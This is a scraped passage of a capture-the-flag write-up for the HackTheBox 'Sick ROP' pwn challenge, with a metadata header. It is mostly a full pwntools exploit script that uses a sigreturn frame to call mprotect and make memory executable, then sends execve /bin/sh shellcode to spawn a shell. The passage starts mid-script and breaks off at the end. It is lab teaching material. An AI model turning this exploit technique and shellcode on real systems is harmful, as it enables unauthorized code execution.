@@ -1,0 +1,13 @@
+---
+SOURCE: livesearch
+URL: https://trustie.medium.com/sick-rop-htb-pwn-challenge-9b1310d9a6b
+CHALLENGE: Sick ROP : HTB pwn challenge - trustie_rity
+EVENT: LiveSearch
+TEAM: N/A
+CATEGORY: rop_chain
+DIFFICULTY: Unknown
+PROTECTIONS: None
+KEY_FUNCTIONS: read
+KEY_TECHNIQUE: Writeup for Sick ROP : HTB pwn challenge - trustie_rity — rop_chain exploitation technique.
+---
+sendline(payload) p.recv() payload = b'B'* (0xf - 1 ) # sigret 15 syscall p.sendline(payload) p.recv() sleep(4) shell_code = b"start5" payload = shell_code.ljust(40, b'A') p.sendline(payload) p.interactive() Note the shell_code value and also note i am using sleep(4) so that the scripts hangs for a 4 seconds as we spawn a new terminal shell and attach gdb to this process using this command gdb-peda -p $(pidof sick_rop) -q This blog will contain how i have configured my gdb. Check it out if you want to configure this wrappers like me! Press enter or click to view image in full size Now that we have an address to jump to, we can change the shell code value to this from exploit db and after that place the address we want to jump to in this case 0x4010b8 . The final exploit looks like this: #!/usr/bin/python3 # Author : trustie_rity from pwn import * elf = ELF('./sick_rop') if args.R: p = remote("*.*.*.*",30479) else: p = elf.process() context.clear(arch='amd64') context.log_level = 'debug' syscall_ret = 0x401014 read = 0x401000 writable = 0x400000 new_ret = 0x400018 vuln = elf.sym.vuln payload = b'A'*40    # to our offset payload += p64(vuln) payload += p64(syscall_ret) frame = SigreturnFrame(kernel="amd64") frame.rax = 0xa     # syscall for mprotect() frame.rdi = writable frame.rsi = 0x4000 frame.rdx = 0x7    # rwx (read ,write , execute) frame.rsp = 0x4010d8 # this will be our new stack kind of ie addr 0x400... frame.rip = syscall_ret payload += bytes(frame) # fake sigreturnframe # sending p.sendline(payload) p.recv() payload = b'B'* (0xf - 1 ) # sigret 15 syscall p.sendline(payload) p.recv() # shellcode shell_code = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05" payload = shell_code.ljust(40, b'A') payload += p64(0x4010b8) log.info('[*] Sending second stage payload with {} bytes ...'.format(len(payload))) p.sendline(payload) p.interactive() And we get a shell Press enter or click to view image in full size Follow me for m
